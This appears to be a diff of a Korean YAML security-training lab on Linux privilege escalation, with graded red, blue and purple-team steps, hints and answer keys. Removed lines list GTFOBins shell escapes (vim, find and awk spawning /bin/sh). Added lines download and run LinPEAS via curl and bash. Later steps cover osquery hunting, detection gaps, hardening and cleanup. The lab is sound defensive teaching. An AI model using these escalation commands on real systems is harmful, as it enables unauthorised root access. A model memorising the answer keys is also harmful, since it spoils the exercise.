       field: stdout
       semantic:
-        intent: "LinPEAS + GTFOBins"
-        success_criteria: ["LinPEAS 다운로드"]
+        intent: Red — LinPEAS 자동 enum + 폐쇄망 fallback.
+        success_criteria: ["LinPEAS 다운로드 시도(byte)", "자동/수동 enum 결과", "폐쇄망 패턴 인지"]
         acceptable_methods:
-          - "**[OSS] LinPEAS / WinPEAS**"
-          - "**[OSS] PEASS-ng (모던 fork)**"
-          - "**[OSS] GTFOBins SUID cheat sheet**"
-          - "**[OSS] vim -c ':!/bin/sh'**"
-          - "**[OSS] find . -exec /bin/sh \\;**"
-          - "**[OSS] awk 'BEGIN{system(\"/bin/sh\")}'**"
-          - "**[OSS] sudo + GTFOBins 결합**"
-          - "**[OSS] T1548.001 setuid/setgid**"
+          - |
+            **[OSS] LinPEAS / PEASS-ng** — 자동 enum 표준.
+              curl ... linpeas.sh -o /tmp/linpeas.sh; bash /tmp/linpeas.sh -a
+            예상 출력 `byte 수 + sudo/SUID/docker 발견`.
+            운영 해석: 5 카테고리 + 100항목 자동 점검.
+          - |
+            **[OSS] 폐쇄망 수동 fallback** — 도구 부재 대응.
+              find -perm -4000 + sudo -n -l + id docker
+            예상 출력 `수동 enum 결과`.
+            운영 해석: 사전배포 또는 내장 도구 enum.
+          - "**[OSS] linux-smart-enumeration / linuxprivchecker** — 대체 도구."
+        negative_signs: ["byte 확인 없음", "폐쇄망 시 fallback 누락"]
     target_vm: bastion
+    risk_level: low
+
+  - order: 6
+    instruction: |
+      ## 🎯 MISSION (Blue Team — osquery 헌팅)
+
+      Red 의 권한 상승 시도를 방어자 관점에서 탐지하라. bastion 에는 osquery 가 설치되어
+      있다. SUID binary, cron, root 계정, 권한 상승 단서를 osquery 로 헌팅한다.
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-bastion '
+      echo "=== SUID binary (의심 비표준 탐지) ==="
+      sudo osqueryi --json "SELECT path FROM suid_bin LIMIT 8;" 2>/dev/null
+      echo "=== cron job (의심 명령) ==="
+      sudo osqueryi --json "SELECT command FROM crontab LIMIT 3;" 2>/dev/null
+      echo "=== UID 0 계정 (백도어 root 탐지) ==="
+      sudo osqueryi --json "SELECT username,uid FROM users WHERE uid=0;" 2>/dev/null
+      echo "=== docker 그룹 멤버 (escape 벡터) ==="
+      sudo osqueryi --json "SELECT * FROM user_groups WHERE gid=(SELECT gid FROM groups WHERE groupname=\"docker\");" 2>/dev/null | head
+      '
+      ```
+
+      ## 📋 확인 사항
+
+      - suid_bin: 표준 셋 (비표준 SUID 추가 시 즉시 탐지)
+      - crontab: e2scrub_all (의심 명령 추가 시 탐지)
+      - users uid=0: root 만 (UID 0 백도어 계정 추가 시 탐지)
+      - docker 그룹 멤버: ccc (escape 벡터 보유자 식별)
+
+      ## 💡 왜 이걸 하는가?
+
+      osquery 는 OS 를 SQL 로 질의하는 EDR 도구다. 권한 상승 탐지의 핵심은 *baseline 과의
+      차이* — 비표준 SUID, 의심 cron, 추가된 UID 0 계정, docker 그룹 멤버를 정기 헌팅하면
+      Red 의 enum/persistence 흔적을 잡는다. STEP 3/4 의 권한 상승은 osquery 의 정적
+      스냅샷으로는 *상태 변화* 를 봐야 잡힌다.
+
+      ## 🔍 결과 해석
+
+      - suid_bin/crontab/users 가 baseline 과 동일 = 변조 없음
+      - docker 그룹에 ccc = escape 벡터 보유 (Purple 에서 제거 권고)
+      - osquery 는 정적 스냅샷 — 실시간 행위(sudo 실행)는 auditd/Wazuh 필요(STEP 7)
+
+      ## ⚠️ 비정상 시 대응
+
+      - osqueryi: command not found — `sudo apt install osquery` 또는 미설치
+      - 권한 오류 — sudo 로 실행 (일부 테이블 root 필요)
+    hint: |
+      osquery 헌팅 — suid_bin/crontab/users(uid=0)/user_groups(docker). baseline 차이로
+      비표준 SUID·백도어 root·escape 벡터 탐지. 정적 스냅샷(실시간은 STEP 7).
+    category: blueteam
+    points: 14
+    answer: |
+      ssh -n 6v6-bastion '
+      echo "=== suid_bin ==="; sudo osqueryi --json "SELECT path FROM suid_bin LIMIT 8;" 2>/dev/null
+      echo "=== crontab ==="; sudo osqueryi --json "SELECT command FROM crontab LIMIT 3;" 2>/dev/null
+      echo "=== uid 0 ==="; sudo osqueryi --json "SELECT username,uid FROM users WHERE uid=0;" 2>/dev/null
+      '
+    answer_detail: |
+      osquery 헌팅: suid_bin(gpasswd/sg/passwd 등 표준), crontab(e2scrub_all), users
+      uid=0(root 만). baseline 과 동일 = 변조 없음. ccc 가 docker 그룹 = escape 벡터.
+      osquery 는 정적 스냅샷 — 비표준 SUID·백도어 UID 0·의심 cron 을 baseline 차이로
+      탐지. 실시간 행위(sudo 실행)는 auditd/Wazuh(STEP 7).
+    verify:
+      type: output_contains
+      expect: path
+      field: stdout
+      semantic:
+        intent: Blue — osquery 권한 상승 헌팅(suid_bin/crontab/users).
+        success_criteria: ["suid_bin 쿼리", "users uid=0", "baseline 차이 탐지 개념"]
+        acceptable_methods:
+          - |
+            **[OSS] osquery suid_bin** — SUID 헌팅.
+              sudo osqueryi --json "SELECT path FROM suid_bin;"
+            예상 출력 `표준 SUID 셋`.
+            운영 해석: 비표준 SUID 추가 시 baseline 차이로 탐지.
+          - |
+            **[OSS] osquery users uid=0** — 백도어 root 탐지.
+              sudo osqueryi --json "SELECT username,uid FROM users WHERE uid=0;"
+            예상 출력 `root 만`.
+            운영 해석: UID 0 계정 추가 = persistence 백도어.
+          - |
+            **[OSS] osquery crontab / user_groups** — cron·docker 그룹.
+            예상 출력 `e2scrub_all / docker 멤버 ccc`.
+            운영 해석: 의심 cron + escape 벡터 보유자 식별.
+        negative_signs: ["osquery 안 씀", "baseline 개념 누락"]
+    target_vm: bastion
+    risk_level: low
+
+  - order: 7
+    instruction: |
+      ## 🎯 MISSION (Blue Team — auditd/Wazuh 탐지 한계)
+
+      실시간 권한 상승 행위(sudo 실행, docker escape)를 auditd/Wazuh 가 탐지하는지
+      확인하고, 이 환경의 Detection Gap 을 식별하라.
+
+      ## 💻 실행 명령
+
+      ```bash
+      # auditd 동작 여부 (컨테이너 제한 확인)
+      ssh 6v6-bastion 'sudo auditctl -l 2>&1 | head -3; ls /var/log/audit/audit.log 2>&1'
+      # bastion 이 Wazuh SIEM 에 연결되어 있나 (siem agent 목록)
+      ssh 6v6-siem 'sudo /var/ossec/bin/agent_control -l 2>/dev/null | grep -i bastion || echo "bastion agent 없음"'
+      # 대안 — sysmon-for-linux 설치 여부 (ProcessCreate 탐지)
+      ssh 6v6-bastion 'command -v sysmon 2>/dev/null || echo "sysmon 미설치"'
+      ```
+
+      ## 📋 확인 사항
+
+      - auditd: `Operation not permitted` + audit.log 없음 = **컨테이너에서 auditd 미동작**
+        (audit subsystem 은 host kernel 자원, 컨테이너 제한)
+      - bastion: Wazuh agent **없음** = privesc 행위가 SIEM 미도달
+      - sysmon: 미설치 = ProcessCreate 기반 탐지 불가
+
+      ## 💡 왜 이걸 하는가?
+
+      Blue 의 이상적 탐지는 auditd(execve) + Wazuh rule 5402(sudo command) + sysmon
+      (ProcessCreate parent=sudo)이지만, 이 환경은 (1) 컨테이너라 auditd 가 host kernel
+      audit 에 접근 못 하고, (2) bastion 에 Wazuh agent 가 없어 SIEM 에 신호가 안 가고,
+      (3) sysmon 도 미설치다. 즉 *실시간 권한 상승 행위가 탐지 사각지대* 다 — osquery
+      정적 스냅샷(STEP 6)만으로는 sudo/docker escape 의 실행 순간을 못 잡는다.
+
+      ## 🔍 결과 해석
+
+      - auditd 미동작 + Wazuh agent 부재 + sysmon 부재 = 실시간 privesc 탐지 3중 공백
+      - osquery 정적 헌팅만 가능 = 사후 baseline 차이로만 탐지
+      - 이것이 Purple(STEP 9)의 최우선 보완 대상
+
+      ## ⚠️ 비정상 시 대응
+
+      - auditctl 동작 시 — host 권한 컨테이너(privileged), `auditctl -a` 룰 추가 가능
+      - bastion agent 있으면 — Wazuh rule 5402/100600 으로 sudo 탐지 (Detection Gap 해소)
+    hint: |
+      auditd(컨테이너 미동작) + bastion Wazuh agent 없음 + sysmon 미설치 = 실시간 privesc
+      탐지 3중 공백. osquery 정적 헌팅만 가능. Detection Gap 식별이 핵심.
+    category: blueteam
+    points: 12
+    answer: |
+      echo "=== auditd ==="
+      ssh -n 6v6-bastion 'sudo auditctl -l 2>&1 | head -3; ls /var/log/audit/audit.log 2>&1'
+      echo "=== bastion Wazuh agent ==="
+      ssh -n 6v6-siem 'sudo /var/ossec/bin/agent_control -l 2>/dev/null | grep -i bastion || echo "bastion agent 없음"'
+      echo "=== sysmon ==="
+      ssh -n 6v6-bastion 'command -v sysmon 2>/dev/null || echo "sysmon 미설치"'
+    answer_detail: |
+      auditd: "Operation not permitted" + audit.log 없음 = 컨테이너에서 미동작(audit
+      subsystem 은 host kernel 자원). bastion Wazuh agent 없음 = privesc 가 SIEM 미도달.
+      sysmon 미설치. 실시간 권한 상승 탐지 3중 공백 = osquery 정적 헌팅(STEP 6)만 가능.
+      이것이 이 환경의 핵심 Detection Gap → Purple 최우선 보완.
+    verify:
+      type: output_contains
+      expect: 없음
+      field: stdout
+      semantic:
+        intent: Blue — auditd/Wazuh/sysmon 탐지 한계 + Detection Gap 식별.
+        success_criteria: ["auditd 미동작 확인", "bastion Wazuh agent 부재", "실시간 탐지 공백 결론"]
+        acceptable_methods:
+          - |
+            **[OSS] auditctl -l** — auditd 동작 여부.
+              ssh 6v6-bastion 'sudo auditctl -l; ls /var/log/audit/audit.log'
+            예상 출력 `Operation not permitted / 파일 없음`.
+            운영 해석: 컨테이너라 audit subsystem 미동작.
+          - |
+            **[OSS] agent_control -l grep bastion** — SIEM 통합.
+              ssh 6v6-siem 'sudo /var/ossec/bin/agent_control -l | grep -i bastion'
+            예상 출력 `bastion agent 없음`.
+            운영 해석: privesc 가 SIEM 미도달 = Detection Gap.
+          - "**[OSS] sysmon-for-linux 확인** — ProcessCreate 탐지 가용성."
+        negative_signs: ["Detection Gap 식별 안 함", "auditd 미동작 미확인"]
+    target_vm: bastion
+    risk_level: low
+
+  - order: 8
+    instruction: |
+      ## 🎯 MISSION (Purple Team — Coverage Matrix)
+
+      Red(권한 상승 벡터)와 Blue(탐지 도구)를 통합해 **Coverage Matrix** 를 작성하라.
+      각 벡터를 어느 도구가 탐지 가능한지 매핑하고 사각지대를 정량화한다.
+
+      ## 💻 산출물 (Coverage Matrix)
+
+      ```markdown
+      # W11 Coverage Matrix — 권한 상승 벡터 × 탐지 도구
+      | 벡터 | osquery(정적) | auditd | Wazuh SIEM | sysmon | Coverage |
+      |------|--------------|--------|-----------|--------|----------|
+      | sudo NOPASSWD 활용 | ✗(실행 미탐) | ✗(미동작) | ✗(agent 없음) | ✗(미설치) | 0% |
+      | docker.sock escape | △(docker 그룹 멤버) | ✗ | ✗ | ✗ | 부분 |
+      | 비표준 SUID 추가 | ✓(suid_bin baseline) | ✗ | ✗ | ✗ | 정적 |
+      | UID 0 백도어 추가 | ✓(users 테이블) | ✗ | ✗ | ✗ | 정적 |
+      | 의심 cron 추가 | ✓(crontab 테이블) | ✗ | ✗ | ✗ | 정적 |
+      ## Detection Gap 3종
+      1. 실시간 행위(sudo 실행/docker escape) 탐지 공백 — auditd 미동작 + Wazuh agent 부재 + sysmon 미설치
+      2. osquery 는 정적 스냅샷 — 실행 순간이 아닌 baseline 차이로만 탐지(사후)
+      3. bastion 이 SIEM 미통합 — 모든 privesc 가 관제 화면에 안 보임
+      ## 핵심: 정적 헌팅(osquery)만 가능, 실시간 탐지 전무
+      ```
+
+      ## 📋 채점
+
+      - 5 벡터 × 4 도구 매트릭스
+      - Detection Gap 3종 식별
+
+      ## 💡 왜 이걸 하는가?
+
+      Purple 은 Red 벡터와 Blue 탐지를 한 표로 매핑해 "무엇이 잡히고 무엇이 새는가" 를
+      정량화한다. 이 환경의 진단: 상태 변화(SUID/cron/UID0 추가)는 osquery 로 사후
+      탐지되지만, 실시간 행위(sudo/docker escape 실행)는 전혀 탐지되지 않는다. 탐지
+      도구를 단지 "있다/없다" 가 아니라 "정적 vs 실시간" 으로 구분하는 것이 핵심이다.
+
+      ## 🔍 결과 해석
+
+      - 정적 탐지(osquery)만 가능 + 실시간 공백 = 사후 포렌식은 되나 실시간 대응 불가
+      - Purple 보완 우선순위: 실시간 탐지(auditd/Wazuh) 확보
+    hint: |
+      Coverage Matrix — 5 벡터 × (osquery/auditd/Wazuh/sysmon). Detection Gap 3종(실시간
+      공백 / osquery 정적만 / bastion siem 미통합). 정적 vs 실시간 구분이 핵심.
+    category: purple
+    points: 8
+    answer: |
+      cat <<'EOF'
+      # W11 Coverage Matrix
+      | 벡터 | osquery | auditd | Wazuh | sysmon | Coverage |
+      | sudo NOPASSWD | ✗ | ✗ | ✗ | ✗ | 0% |
+      | docker escape | △ | ✗ | ✗ | ✗ | 부분 |
+      | 비표준 SUID | ✓ | ✗ | ✗ | ✗ | 정적 |
+      | UID 0 백도어 | ✓ | ✗ | ✗ | ✗ | 정적 |
+      | 의심 cron | ✓ | ✗ | ✗ | ✗ | 정적 |
+      ## Detection Gap 3종: 실시간 공백 / osquery 정적만 / bastion siem 미통합
+      EOF
+    answer_detail: |
+      Coverage Matrix: SUID/UID0/cron 추가는 osquery 정적 탐지(✓), sudo NOPASSWD 실행
+      과 docker escape 실시간 행위는 전무(0%). auditd 미동작+Wazuh agent 부재+sysmon
+      미설치. Detection Gap 3종: 실시간 탐지 공백 / osquery 정적만(사후) / bastion SIEM
+      미통합. 정적 vs 실시간 구분이 핵심 진단.
+    verify:
+      type: output_contains
+      expect: Coverage
+      field: stdout
+      semantic:
+        intent: Purple — Coverage Matrix(벡터 × 도구) + Detection Gap 3종.
+        success_criteria: ["벡터별 매트릭스", "Detection Gap 3종", "정적 vs 실시간 구분"]
+        acceptable_methods:
+          - |
+            **[OSS] markdown Coverage Matrix** — Red×Blue 매핑.
+              # 벡터 × (osquery/auditd/Wazuh/sysmon)
+            예상 출력 `매트릭스 표`.
+            운영 해석: 무엇이 잡히고 무엇이 새는가.
+          - |
+            **[OSS] Detection Gap 3종** — 사각지대.
+            예상 출력 `실시간 공백 / 정적만 / siem 미통합`.
+            운영 해석: 정적 vs 실시간 탐지 구분.
+        negative_signs: ["Detection Gap 누락", "정적/실시간 구분 없음"]
+    target_vm: bastion
+    risk_level: low
+
+  - order: 9
+    instruction: |
+      ## 🎯 MISSION (Purple Team — 방어 강화 5 표준 권고)
+
+      Coverage Matrix(STEP 8)의 Detection Gap 을 보완하는 **방어 강화 5 표준** 을
+      구체적 설정과 함께 권고서로 작성하라 (실행 X — 설계만).
+
+      ## 💻 산출물 (방어 강화 권고서)
+
+      ```markdown
+      # W11 방어 강화 5 표준 (Purple 권고)
+      ## 1. sudo NOPASSWD: ALL 제거 (최우선)
+      /etc/sudoers: `ccc ALL=(ALL) NOPASSWD: ALL` → 필요한 명령만 명시 + 비번 요구
+      효과: STEP 3 의 즉시 root 차단. 운영 명령은 부분 sudo 허용.
+      ## 2. ccc 를 docker 그룹에서 제거 + docker.sock 보호 (최우선)
+      gpasswd -d ccc docker / docker.sock 미마운트 또는 socket proxy(read-only API)
+      효과: STEP 4 의 docker escape 차단. rootless docker 검토.
+      ## 3. bastion 에 Wazuh agent 설치 (실시간 탐지)
+      wazuh-agent 설치 + manager(siem) 등록 → rule 5402(sudo) / 100600(root shell) 도달
+      효과: STEP 7 의 SIEM 미통합 Detection Gap 해소.
+      ## 4. osquery daemon mode + scheduled query
+      osqueryd 데몬 + 5분 주기 suid_bin/users/crontab 쿼리 → 변화 알림(FIM)
+      효과: 정적 헌팅을 정기 자동화(사후 → 준실시간).
+      ## 5. SUID/capability 정기 audit + AIDE
+      월별 find -perm -4000 baseline 비교 + AIDE/Tripwire 무결성 검사
+      효과: 비표준 SUID/cap 추가 즉시 탐지.
+      ```
+
+      ## 📋 채점
+
+      - 5 표준 각각 구체적 설정 + 효과
+      - #1(NOPASSWD)·#2(docker)가 Red 벡터를, #3(Wazuh agent)가 Detection Gap 을 직접 보완
+
+      ## 💡 왜 이걸 하는가?
+
+      Purple 의 최종 산출물은 "Red 벡터 차단 + Blue gap 해소" 의 구체적 조치다. 이 환경의
+      1순위는 root 직행 벡터 2개(NOPASSWD 제거 + docker 그룹/sock 보호), 2순위는 실시간
+      탐지 공백 해소(bastion Wazuh agent). 추상적 권고가 아니라 실제 명령/설정까지 제시한다.
+
+      ## 🔍 결과 해석
+
+      - 5 표준 적용 시: root 직행 벡터 차단 + 실시간 탐지 확보 + 정기 무결성 검사
+    hint: |
+      방어 5표준 — (1)NOPASSWD 제거 (2)docker 그룹 제거+sock 보호 (3)bastion Wazuh agent
+      (4)osquery daemon (5)SUID audit+AIDE. #1#2 가 Red 벡터, #3 이 Detection Gap 보완.
+    category: purple
+    points: 10
+    answer: |
+      cat <<'EOF'
+      # W11 방어 강화 5 표준
+      1. sudo NOPASSWD: ALL 제거(최우선): 필요 명령만 + 비번 → STEP3 차단
+      2. ccc docker 그룹 제거 + docker.sock 미마운트/proxy → STEP4 차단
+      3. bastion 에 Wazuh agent 설치 → rule 5402/100600 도달(실시간 탐지)
+      4. osqueryd daemon + 5분 주기 suid_bin/users/crontab → 준실시간
+      5. SUID/cap 월별 audit + AIDE/Tripwire 무결성
+      EOF
+    answer_detail: |
+      방어 5표준: (1) sudo NOPASSWD ALL 제거(필요 명령만+비번) → STEP3 차단, (2) ccc
+      docker 그룹 제거 + docker.sock 미마운트/socket proxy → STEP4 차단, (3) bastion 에
+      Wazuh agent 설치 → rule 5402(sudo)/100600(root shell) 도달(실시간 탐지, STEP7 gap
+      해소), (4) osqueryd daemon 정기 쿼리(준실시간), (5) SUID/cap audit + AIDE. #1#2 가
+      Red 벡터, #3 이 Detection Gap 직접 보완.
+    verify:
+      type: output_contains
+      expect: NOPASSWD
+      field: stdout
+      semantic:
+        intent: Purple — 방어 강화 5 표준(NOPASSWD/docker 제거 + Wazuh agent + 탐지).
+        success_criteria: ["NOPASSWD 제거", "docker 그룹/sock 보호", "bastion Wazuh agent(Detection Gap)"]
+        acceptable_methods:
+          - |
+            **[OSS] sudoers NOPASSWD 제거** — 벡터 1 차단.
+              /etc/sudoers: NOPASSWD ALL → 필요 명령만 + 비번
+            예상 출력 `즉시 root 차단`.
+            운영 해석: STEP3 권한 상승 차단.
+          - |
+            **[OSS] docker 그룹 제거 + sock 보호** — 벡터 2 차단.
+              gpasswd -d ccc docker / docker.sock 미마운트
+            예상 출력 `escape 차단`.
+            운영 해석: STEP4 컨테이너 탈출 차단.
+          - |
+            **[OSS] bastion Wazuh agent + osqueryd + AIDE** — 탐지 강화.
+            예상 출력 `실시간 탐지 + 정기 무결성`.
+            운영 해석: Detection Gap 해소 + 준실시간 헌팅.
+        negative_signs: ["NOPASSWD/docker 미언급", "Detection Gap 보완 누락"]
+    target_vm: bastion
+    risk_level: low
+
+  - order: 10
+    instruction: |
+      ## 🎯 MISSION (Cleanup)
+
+      실습 중 생성한 임시 산출물(escape 컨테이너, LinPEAS, 임시 파일)을 정리하고, 실습이
+      sudoers/그룹 등 환경 설정에 영구 변경을 남기지 않았는지 확인하라.
+
+      ## 💻 실행 명령
+
+      ```bash
+      ssh 6v6-bastion '
+      # escape 실습의 임시 컨테이너 정리 (--rm 썼으면 이미 자동 삭제, dangling 확인)
+      docker ps -a --filter "ancestor=alpine" --format "{{.ID}}" | xargs -r docker rm -f 2>/dev/null; echo "escape 컨테이너 정리"
+      # LinPEAS 임시 파일 삭제
+      rm -f /tmp/linpeas.sh 2>/dev/null; echo "linpeas.sh 삭제"
+      # 환경 미변경 확인 — sudoers 와 docker 그룹은 실습으로 바꾸지 않음(STEP 9 는 권고만)
+      echo "=== sudoers NOPASSWD 그대로? ==="; sudo -n -l 2>&1 | grep -i nopasswd
+      echo "=== ccc docker 그룹 그대로? ==="; id | grep -o docker
+      echo "=== UID 0 계정 root 만? (백도어 미추가) ==="; sudo awk -F: "\$3==0 {print \$1}" /etc/passwd
+      '
+      echo "=== cleanup 완료 ==="
+      ```
+
+      ## 📋 확인 사항
+
+      - escape 컨테이너 정리 (--rm 으로 자동 삭제됐어도 dangling 확인)
+      - linpeas.sh 삭제
+      - sudoers/docker 그룹/UID 0 미변경 (실습은 권한 상승 *시도/입증* 만, 설정 변경 X)
+
+      ## 💡 왜 이걸 하는가?
+
+      권한 상승 실습은 강력한 도구를 다루므로 cleanup 이 특히 중요하다. escape 컨테이너,
+      다운로드한 도구를 정리하고, STEP 9 에서 권고한 설정 변경(NOPASSWD 제거 등)을 *실제로
+      하지 않았음* 을 확인한다 (권고는 설계, 적용은 운영팀 결정). 또한 백도어 UID 0 계정이
+      추가되지 않았는지 확인해 실습이 영구 흔적을 남기지 않았음을 보장한다.
+
+      ## 🔍 결과 해석
+
+      - cleanup 완료 + 설정 미변경 = 다음 실습 영향 없음
+      - UID 0 = root 만 = 백도어 미추가 (실습 무결성)
+
+      ## ⚠️ 비정상 시 대응
+
+      - dangling 컨테이너 — `docker rm -f <id>` 로 제거
+      - UID 0 가 root 외 추가됨 — 실습 중 백도어 생성, 즉시 제거 후 보고
+    hint: |
+      escape 컨테이너 + linpeas.sh 정리 + sudoers/docker 그룹/UID0 미변경 확인.
+      실습은 권한 상승 시도/입증만, 설정 변경 X(STEP9 권고는 설계). 백도어 미추가 확인.
+    category: cleanup
+    points: 6
+    answer: |
+      ssh -n 6v6-bastion '
+      docker ps -a --filter "ancestor=alpine" --format "{{.ID}}" | xargs -r docker rm -f 2>/dev/null; echo "escape 컨테이너 정리"
+      rm -f /tmp/linpeas.sh 2>/dev/null; echo "linpeas.sh 삭제"
+      echo "=== NOPASSWD 그대로 ==="; sudo -n -l 2>&1 | grep -i nopasswd
+      echo "=== docker 그룹 ==="; id | grep -o docker
+      echo "=== UID 0 ==="; sudo awk -F: "\$3==0 {print \$1}" /etc/passwd
+      '
+      echo "=== cleanup 완료 ==="
+    answer_detail: |
+      cleanup: escape 실습의 alpine 컨테이너 정리(--rm 자동 삭제+dangling 확인), linpeas.sh
+      삭제, sudoers NOPASSWD/docker 그룹/UID 0(root 만) 미변경 확인. 실습은 권한 상승
+      시도·입증만 수행하고 설정은 안 바꿈(STEP9 권고는 설계). 백도어 UID 0 미추가 = 무결성.
+    verify:
+      type: output_contains
+      expect: 완료
+      field: stdout
+      semantic:
+        intent: Cleanup — escape 컨테이너/도구 정리 + 설정 미변경 확인.
+        success_criteria: ["escape 컨테이너 정리", "linpeas 삭제", "sudoers/docker/UID0 미변경"]
+        acceptable_methods:
+          - |
+            **[OSS] docker rm escape 컨테이너** — 임시 컨테이너 정리.
+              docker ps -a --filter ancestor=alpine | xargs docker rm -f
+            예상 출력 `정리 완료`.
+            운영 해석: escape 실습 흔적 제거.
+          - |
+            **[OSS] rm linpeas.sh** — 다운로드 도구 정리.
+            예상 출력 `삭제`.
+            운영 해석: 다음 실습 영향 제거.
+          - |
+            **[OSS] sudoers/docker/UID0 미변경 확인** — 무결성.
+              sudo -n -l | grep nopasswd; id | grep docker; awk UID 0
+            예상 출력 `설정 그대로 + UID 0 root 만`.
+            운영 해석: 권고는 설계, 백도어 미추가.
+        negative_signs: ["정리 누락", "설정 변경됨", "백도어 UID 0 추가"]
+    target_vm: bastion
+    risk_level: low
